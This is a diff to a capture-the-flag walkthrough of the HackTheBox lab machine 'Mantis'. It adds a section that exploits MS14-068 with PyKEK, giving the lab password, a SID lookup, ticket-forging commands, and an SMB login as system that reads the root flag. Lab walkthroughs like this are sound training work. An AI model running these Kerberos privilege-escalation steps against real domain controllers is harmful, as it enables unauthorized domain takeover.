@@ -4,6 +4,7 @@
 2. Ports 8080 and 1337
 3. MSSQL Enumeration 
 4. MS14-068 with Impacket
+5. MS14-068 with PyKEK
 
 ### Service Discovery
 We start out as usual with a simple nmap scan
@@ -192,7 +193,7 @@ CME          10.10.10.52:445 MANTIS          james (1103)/BadPasswordCount: 0
 CME          10.10.10.52:445 MANTIS          james (1103)/LogonCount: 26
 [*] KTHXBYE!
 ```
-### MS14-068
+### Impacket MS14-068
 
 Lets try this account with another impacket tool, goldenPac, against the kerberos on this machine. First add these two lines to /etc/hosts
 ```
@@ -222,7 +223,46 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 C:\Windows\system32>whoami
 nt authority\system
 ```
-So that was fun, the box may have been patched as the James user was able to just psexec onto the machine for a system shell before it was retired which was an unintented method for this one. I've never actually used goldenPac before for ms14-068 and have done this in the past by running Pykek and following along with articles like these
+
+### PyKek 
+
+So we can also exploit this Kerberos using PyKEK by Bidord, to start make sure this is in /etc/hosts
+```
+10.10.10.52 mantis.htb.local
+10.10.10.52 htb.local
+```
+
+And this in /etc/resolv.conf
+```
+nameserver 10.10.10.52
+```
+
+Then we get James's SID with rpcclient
+```
+root@sushi:~#rpcclient -U james 10.10.10.52
+Enter james's password: J@m3s_P@ssW0rd!
+rpcclient $> lookupnames james
+james S-1-5-21-4220043660-4019079961-2895681657-1103
+```
+Clone PyKEK, then create the golden ticket and copy it to /tmp
+```
+root@sushi:~# git clone https://github.com/bidord/pykek && cd pykek
+root@sushi:~# python2 ms14-068.py -u james@htb.local -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis.htb.local
+Password:J@m3s_P@ssW0rd!
+
+root@sushi:~# cp TGT_james@htb.local.ccache /tmp/krb5cc_$(echo $UID)
+```
+
+Then connect as system with smbclient
+```
+root@sushi:~# smbclient -k -U james \\\\mantis.htb.local\\C$
+
+OS=[Windows Server 2008 R2 Standard 7601 Service Pack 1] Server=[Windows Server 2008 R2 Standard 6.1]
+smb: \> more \USERS\Administrator\DESKTOP\root.txt
+---redacted---
+```
+
+The box may have been patched as the James user was able to just psexec onto the machine for a system shell before it was retired which was an unintented method for this one. Some further reading:
 
 http://blog.liatsisfotis.com/knock-and-pass-kerberos-exploitation.html
 
